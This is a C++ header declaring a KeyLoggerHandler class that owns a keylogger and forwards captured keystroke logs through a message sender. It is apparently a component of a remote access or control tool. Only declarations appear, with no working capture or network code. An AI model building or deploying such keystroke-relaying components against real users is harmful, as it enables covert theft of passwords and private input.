#pragma once

#include "IMessageHandler.h"
#include "IMessageSender.h"
#include "KeyLoggerOwner.h"

class KeyLoggerHandler : public IMessageHandler
{
public:
	explicit KeyLoggerHandler(std::shared_ptr<IMessageSender> sender);

	void Handle(MessageType type, SharedSpan content) override;

private:
	void OnKeyLog(const std::string& log) const;

	std::shared_ptr<IMessageSender> _sender;
	std::unique_ptr<KeyLoggerOwner> _keyLogger;
};

